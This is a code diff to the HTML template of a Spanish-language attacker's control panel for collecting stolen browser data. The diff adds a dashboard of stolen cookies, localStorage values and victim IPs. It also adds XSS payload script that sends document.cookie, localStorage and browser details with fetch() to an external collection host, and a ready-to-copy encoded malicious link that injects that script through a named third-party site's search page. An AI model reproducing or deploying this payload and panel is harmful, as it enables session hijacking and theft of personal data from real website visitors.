@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>svr</title>
+    <title>☠️ Servidor del Atacante</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -73,60 +73,117 @@
         hr {
             border-color: #333;
         }
+        .endpoint {
+            color: #ffd700;
+        }
+        .texto-pequeno {
+            font-size: 12px;
+            color: #666;
+        }
+        @media (max-width: 600px) {
+            .estadisticas {
+                grid-template-columns: 1fr;
+            }
+            .container {
+                padding: 15px;
+            }
+            .codigo {
+                font-size: 12px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>SVR</h1>
+        <h1>☠️ SVR</h1>
         
         <div class="info">
-            <p>Svr active</p>
-            <p>rcb data: <code>/robar?cookie=...&data=...&url=...</code></p>
-            <p>Panel: <a href="/panel" style="color: #00ff41;">/panel</a></p>
+            <p>📡 Servidor activo</p>
+            <p>🔗 Ruta para recibir datos: <code class="endpoint">/stl?cookie=...&amp;data=...&amp;url=...</code></p>
+            <p>👀 Panel de control: <a href="/panel" style="color: #00ff41;">/panel</a></p>
+            <p>📊 API JSON: <a href="/api/stl" style="color: #00ff41;">/api/stl</a></p>
         </div>
         
         <div class="estadisticas">
             <div class="card">
                 <div class="numero">{{ total }}</div>
-                <div class="label">Total data</div>
+                <div class="label">Total de datos robados</div>
             </div>
             <div class="card">
-                <div class="numero">{{ last_stl.date|date:"H:i:s"|default:"N/A" }}</div>
-                <div class="label">last stl</div>
+                <div class="numero">{{ last_stl.fecha|date:"H:i:s"|default:"N/A" }}</div>
+                <div class="label">Último robo</div>
             </div>
         </div>
         
         {% if last_stl %}
         <div style="background: #111; padding: 15px; border-radius: 8px; border: 1px solid #333;">
-            <h3>last data:</h3>
+            <h3>📦 Último dato robado:</h3>
             <p><strong>IP:</strong> {{ last_stl.ip }}</p>
-            <p><strong>Cookie:</strong> <code style="color: #ffd700; word-break: break-all;">{{ last_stl.cookie|truncatechars:100 }}</code></p>
+            <p><strong>Cookie:</strong> <code style="color: #ffd700; word-break: break-all; font-size: 12px;">{{ last_stl.cookie|truncatechars:100 }}</code></p>
+            <p><strong>Data:</strong> <code style="color: #81c784; word-break: break-all; font-size: 12px;">{{ last_stl.data|truncatechars:100 }}</code></p>
         </div>
         {% endif %}
         
         <hr>
         
-        <h2>atk code</h2>
-        <p>:</p>
+        <h2>🔧 Código del ataque</h2>
+        <p>Este es el código que el atacante inyecta en el sitio vulnerable:</p>
         <div class="codigo">
             &lt;script&gt;<br>
-            &nbsp;&nbsp;// cookies<br>
-            &nbsp;&nbsp;fetch('http://localhost:8000/stl?cookie=' + document.cookie);<br>
+            &nbsp;&nbsp;// Robar cookies<br>
+            &nbsp;&nbsp;fetch('https://ax-mntt.onrender.com/stl?cookie=' + document.cookie);<br>
             &nbsp;&nbsp;<br>
-            &nbsp;&nbsp;// localStorage<br>
-            &nbsp;&nbsp;fetch('http://localhost:8000/stl?data=' + localStorage.getItem('datos'));<br>
+            &nbsp;&nbsp;// Robar datos del localStorage<br>
+            &nbsp;&nbsp;fetch('https://ax-mntt.onrender.com/stl?data=' + localStorage.getItem('datos_usuario'));<br>
             &nbsp;&nbsp;<br>
-            &nbsp;&nbsp;// URL<br>
-            &nbsp;&nbsp;fetch('http://localhost:8000/stl?url=' + window.location.href);<br>
+            &nbsp;&nbsp;// Robar la URL actual<br>
+            &nbsp;&nbsp;fetch('https://ax-mntt.onrender.com/stl?url=' + window.location.href);<br>
+            &nbsp;&nbsp;<br>
+            &nbsp;&nbsp;// Robar información del navegador<br>
+            &nbsp;&nbsp;fetch('https://ax-mntt.onrender.com/stl?data=' + JSON.stringify({<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;userAgent: navigator.userAgent,<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;language: navigator.language,<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;platform: navigator.platform<br>
+            &nbsp;&nbsp;}));<br>
             &lt;/script&gt;
         </div>
         
         <hr>
         
+        <h3>📋 Enlace malvado (codificado)</h3>
+        <div class="codigo" style="font-size: 12px; word-break: break-all;" id="enlaceMalvado">
+            https://catamarcadespierta.com.ar/resultados/?q=%3Cscript%3Efetch('https%3A//ax-mntt.onrender.com/stl%3Fcookie%3D'%2Bdocument.cookie)%3Bfetch('https%3A//ax-mntt.onrender.com/stl%3Fdata%3D'%2BlocalStorage.getItem('datos_usuario'))%3B%3C/script%3E
+        </div>
+        <button onclick="copiarEnlace()" style="margin-top: 10px; padding: 8px 16px; background: #00ff41; color: #0a0a0a; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">📋 Copiar enlace</button>
+        
+        <hr>
+        
         <p style="text-align: center;">
-            <a href="/panel" class="btn">panel</a>
-            <a href="/admin" class="btn" style="background: #333;">Admin</a>
+            <a href="/panel" class="btn">👀 Ver panel de control</a>
+            <a href="/admin" class="btn" style="background: #333;">⚙️ Admin</a>
+        </p>
+        
+        <p class="texto-pequeno" style="text-align: center; margin-top: 20px;">
+            🛡️ <strong>URL de tu servidor:</strong> https://ax-mntt.onrender.com
         </p>
     </div>
+    
+    <script>
+        function copiarEnlace() {
+            const enlace = document.getElementById('enlaceMalvado').textContent;
+            navigator.clipboard.writeText(enlace).then(() => {
+                alert('✅ Enlace copiado al portapapeles');
+            }).catch(() => {
+                // Fallback para navegadores sin clipboard API
+                const textarea = document.createElement('textarea');
+                textarea.value = enlace;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('✅ Enlace copiado al portapapeles');
+            });
+        }
+    </script>
 </body>
 </html>
